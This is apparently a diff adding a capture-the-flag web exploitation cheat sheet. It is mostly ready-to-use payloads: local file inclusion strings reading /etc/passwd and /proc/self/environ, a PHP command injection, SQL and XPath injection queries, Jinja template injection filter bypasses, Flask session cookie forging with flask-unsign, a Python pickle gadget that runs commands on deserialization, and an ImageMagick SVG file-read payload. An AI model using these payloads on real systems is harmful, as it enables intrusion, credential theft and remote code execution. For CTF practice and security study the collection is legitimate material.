@@ -1,0 +1,92 @@
+### Interesting files
+
+- `/robots.txt`
+- `/.git`
+- `/sitemap.xml`
+
+### Interesting protocols
+
+- `file:///etc/passwd`
+
+### Interesting headers
+
+  - `X-Forwarded-Host`
+    - Password reset poisoning
+
+### Local File Inclution
+
+- `?file=php://filter/convert.base64-encode/resource=/etc/passwd`
+- `?file='.system("cat /flag*").'`
+- `../../../../../../proc/self/environ`
+- `/_nuxt/@fs/flag.txt`
+
+### SQLi
+
+- `UNION`
+
+```
+' UNION SELECT current_database() as name --
+' AND 1=0 UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS --
+```
+
+### XPath Injection
+
+```
+'or string-length(name(.))=5 or '!'='
+' or substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE) or '!'='
+'or contains(.,'admin') or'
+a' or (substring((//flag)[1], 1, 1)) = 'a
+```
+
+### Type juggling with data
+
+- `Playing with header`
+
+  - `curl -H "User-Agent: SUPER SECRET AGENT" http://victim.com/`
+  - [code](https://github.com/ByamB4/CCC/blob/master/Web%20Exploitation/src/post-nullbyte.py)
+
+### Server side template injection (SSTI)
+
+- `Python`
+
+  - Filtered `.`, `[]`
+    - `obj.attribute` -> `obj|attr('attribute')` (`attr` is a filter in jinja template engine)
+    - `obj[index]` -> `obj.__getitem__(index)` -> `obj|attr('__getitem__')(index)`
+    - `obj['key']` -> `obj.__getitem__('key')` -> `obj|attr('__getitem__')('key')`
+
+### JWT
+
+- `Flask session cookie`
+    - `flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.Yg9geQ.s8MKSRemMQyS5S60QTS0lY0Xg0o`
+    - `flask-unsign --unsign --cookie < cookie.txt`
+    - `flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'`
+    
+- https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+
+
+### Python pickle
+
+```python
+import pickle, base64
+
+class DillPickle:
+  def __reduce__(self):
+    import subprocess
+    return (subprocess.check_output, (['/bin/cat', '/ls'],))
+
+p = pickle.dumps(DillPickle())
+print(base64.b64encode(p).decode('ASCII'))
+```
+
+### Imagemagick
+
+- File upload read local file (xxe)
+
+  - Payload 
+    ```
+      <?xml version="1.0" encoding="UTF-8"?>
+      <svg width="500px" height="500px">
+        <image width="500" height="500" href="text:/etc/passwd" />
+      </svg>
+    ```
+
